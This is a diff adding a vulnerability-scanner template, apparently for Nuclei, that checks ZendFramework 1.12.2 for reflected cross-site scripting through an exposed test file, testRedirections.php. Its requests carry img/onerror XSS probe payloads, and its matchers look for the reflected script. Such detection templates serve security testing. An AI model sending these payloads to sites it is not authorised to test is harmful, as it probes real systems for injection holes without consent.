@@ -1,0 +1,36 @@
+id: zend-v1-xss
+
+info:
+  name: ZendFramework 1.12.2 - Cross-Site Scripting
+  author: HuanXiong
+  severity: medium
+
+  tags: XSS
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/vendor/diablomedia/zendframework1-http/tests/Zend/Http/Client/_files/testRedirections.php?redirection=3&param=<img/src=x%20onerror=alert(1)>"
+      - "{{BaseURL}}/tests/Zend/Http/Client/_files/testRedirections.php?redirection=3&param=<img/src=x%20onerror=alert(document.domain)>"
+
+    stop-at-first-match: true
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '"redirection"]'
+          - '"param"'
+          - '<img/src=x onerror=alert(document.domain)'
+        condition: and
+
+      - type: word
+        part: header
+        words:
+          - text/html
+
+      - type: status
+        status:
+          - 200
+
